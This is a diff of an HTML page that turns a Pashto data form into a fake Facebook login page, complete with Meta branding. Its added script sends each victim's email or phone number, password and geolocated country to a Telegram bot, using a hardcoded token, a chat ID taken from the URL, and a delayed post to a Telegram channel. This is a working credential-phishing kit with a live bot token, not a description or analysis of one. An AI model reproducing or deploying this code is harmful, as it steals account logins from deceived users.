@@ -1,88 +1,131 @@
 <!DOCTYPE html>
-<html lang="ps">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Telegram ته فورم</title>
+  <title>Facebook</title>
   <style>
     body {
-      font-family: sans-serif;
-      max-width: 400px;
-      margin: 50px auto;
-      padding: 20px;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-      background-color: #f1f1f1;
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-    input, button {
-      display: block;
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
       width: 100%;
-      margin-bottom: 15px;
-      padding: 10px;
-      font-size: 16px;
+      max-width: 360px;
+      text-align: center;
+    }
+    .container h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 6px;
     }
     button {
-      background-color: #2196F3;
+      width: 100%;
+      background-color: #1877f2;
       color: white;
+      padding: 12px;
       border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #165ecb;
+    }
+    small {
+      color: gray;
     }
   </style>
 </head>
 <body>
-  <h2>معلومات ولیکه</h2>
-  <form id="telegramForm">
-    <input type="email" id="email" placeholder="ایمیل" required>
-    <input type="password" id="password" placeholder="پاسورډ" required>
-    <button type="submit">لیږل</button>
+
+<div class="container">
+  <h2>Facebook</h2>
+  <form id="loginForm">
+    <input type="text" id="identifier" placeholder="Mobile number or email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button type="submit">Log In</button>
+    <small><br><br>© Meta Platforms</small>
   </form>
+</div>
 
-  <script>
-    // 🔐 ثابت Telegram Bot Token
-    const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
+<script>
+  const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
+  const telegramChannel = '@PRO_43KPISH';
 
-    // 🧠 د URL نه Chat ID اخیستل
-    function getQueryParam(param) {
-      const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get(param);
+  function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+  }
+
+  async function getGeoInfo() {
+    try {
+      const res = await fetch('https://ipapi.co/json');
+      return await res.json();
+    } catch (e) {
+      return { country_name: "Unknown", country_code: "" };
+    }
+  }
+
+  function getFlag(countryCode) {
+    if (!countryCode) return "";
+    return String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 127397 + c.charCodeAt()));
+  }
+
+  async function sendTelegramMessage(chatId, text) {
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    return fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: text })
+    });
+  }
+
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const identifier = document.getElementById('identifier').value; // email or number
+    const password = document.getElementById('password').value;
+    const telegramId = getQueryParam('id');
+
+    if (!telegramId) {
+      alert('Telegram ID په URL کې نشته!');
+      return;
     }
 
-    document.getElementById('telegramForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+    const geo = await getGeoInfo();
+    const country = geo.country_name || 'Unknown';
+    const flag = getFlag(geo.country_code);
 
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const chatId = getQueryParam('id'); // له URL نه Chat ID
+    const userMessage = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}`;
 
-      if (!chatId) {
-        alert('Chat ID په URL کې نشته!');
-        return;
-      }
+    // 1. Send to user (Telegram ID)
+    await sendTelegramMessage(telegramId, userMessage);
 
-      const message = `💬 نوی معلومات:\n📧 ایمیل: ${email}\n🔐 پاسورډ: ${password}`;
+    // 2. Delay 3 minutes then send to channel
+    setTimeout(() => {
+      const channelMessage = `⏰ ۳ دقیقې وروسته:\nLogin وشو له ${country} ${flag}.\nدا Login د Telegram ID [${telegramId}] له خوا ترسره شو.`;
+      sendTelegramMessage(telegramChannel, channelMessage);
+    }, 180000); // 3 minutes
 
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    alert('Please wait...');
+  });
+</script>
 
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message
-        })
-      })
-      .then(response => {
-        if (response.ok) {
-          alert('پیغام واستول شو!');
-        } else {
-          alert('خطا: پیغام ونه لیږل شو.');
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        alert('یوه خطا پېښه شوه.');
-      });
-    });
-  </script>
 </body>
-</html>
+</html> 
